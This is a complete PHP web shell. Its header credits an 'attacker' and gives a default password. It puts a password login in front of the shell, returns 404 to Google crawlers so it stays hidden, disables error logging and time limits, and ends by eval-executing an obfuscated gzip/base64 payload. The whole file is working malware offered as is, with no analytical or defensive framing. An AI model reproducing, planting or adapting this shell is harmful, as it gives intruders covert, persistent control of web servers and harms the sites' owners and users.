<?php 
/* (Web Shell 1n73ction r3c0d3d by ismail attacker |default pass:" javacyber ") */ 
$auth_pass = "6138f95a7e66e7373c8d770ad348d13c"; 
$color = "#008B8B"; 
$default_action = 'FilesMan'; 
@define('SELF_PATH', __FILE__); 
if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) { 
    header('HTTP/1.0 404 Not Found'); 
    exit; 
} 
@session_start(); 
@error_reporting(0); 
@ini_set('error_log',NULL); 
@ini_set('log_errors',0); 
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0); 
@ini_set('display_errors', 0);
@set_time_limit(0); 
@set_magic_quotes_runtime(0); 
@define('VERSION', '2.1'); 
if( get_magic_quotes_gpc() ) { 
    function stripslashes_array($array) { 
        return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array); 
    } 
    $_POST = stripslashes_array($_POST); 
} 
function printLogin() { 
    ?> 
<TITLE>[#] Nabilah Dot ID ( JCA shell )</TITLE> 
<body BGCOLOR="black">
<p><center><img src="http://s12.postimg.org/8h0rau6d9/coollogo_com_161484773.png" width="405" height="120"></center>
<hr> 
<address></address> 
<style> 
        input { margin:0;background-color:#fff;border:1px solid #fff; } 
    </style> 
    <center> 
    <form method=post > 
    <input type=password name=pass > 
    </form></center> 
    <?php 
    exit; 
} 
if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) 
    if( empty( $auth_pass ) || 
        ( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $auth_pass ) ) ) 
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
    else 
        printLogin();

eval(gzuncompress(base64_decode("eNpTKU4uyiwoUbBVSMvMSY1PTy2JT87PK0nNKynWUM8oKSmw0tcvSCwuSU3KzNNLzs/VL0os1yvIKLDPtC3LDnMPCCg3Ude05uVKLUvM0UivysxLy0ksSdVISixONTOJT0lNzk9J1VCBWKKpqWkNANFIJwc="))); ?>